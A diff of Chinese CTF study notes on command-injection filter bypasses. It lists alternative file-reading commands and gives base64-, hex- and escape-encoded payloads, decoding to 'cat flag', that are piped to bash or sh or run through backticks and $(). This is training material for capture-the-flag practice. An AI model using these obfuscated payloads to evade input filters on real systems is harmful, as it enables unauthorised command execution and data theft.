@@ -14,7 +14,7 @@ typora-copy-images-to: ./..\images
 
 只返回最后一行，返回所有需要输出的arrays
 
-### 3.passthru（' '）
+### 3.passthru（“”）
 
 直接执行命令
 
@@ -132,10 +132,60 @@ echo f${PATH:5:1}   输出fl
 
 # 5.常见文件读取命令绕过
 
-1.tac
+1.tac:反向显示,倒数第一行，倒数第二行
 
-反向显示
+2.more：一页一页的显示
 
-2.
+3.less：与more相同
 
-# 1.编码绕过
+4.tail：显示最后10行
+
+5.nl：作用和cat一样，输出时加上行号
+
+6.od：以二进制的方式读取
+
+7.od -A -d -c:转换为ascii码
+
+8.xxd：二进制和ascii码都显示
+
+9.sort：用于排序文件
+
+10.uniq：报告或删除文件中重复的内容
+
+11.file -f：报错出具体内容
+
+# 6.编码绕过
+
+##  1.base64编码
+
+echo Y2F0IGZsYWcK | base64 -d | /bin/bash
+
+echo Y2F0IGZsYWcK | base64 -d | bash
+
+echo Y2F0IGZsYWcK | base64 -d | sh
+
+\`echo Y2F0IGZsYWcK | base64 -d `     ``表示执行
+
+$(echo Y2F0IGZsYWcK | base64 -d)
+
+## 2.base32
+
+将上述编码换位base32
+
+## 3.HEX编码
+
+echo 63617420666c61672e706870| xxd -r -p | /bin/bash
+
+echo 63617420666c61672e706870| xxd -r -p| bash
+
+echo 63617420666c61672e706870| xxd -r -p | sh
+
+\`echo 63617420666c61672e706870| xxd -r -p `     ``表示执行
+
+$(echo 63617420666c61672e706870| xxd -r -p)
+
+## 4.shellcode
+
+echo \x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70
+
+print \x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70
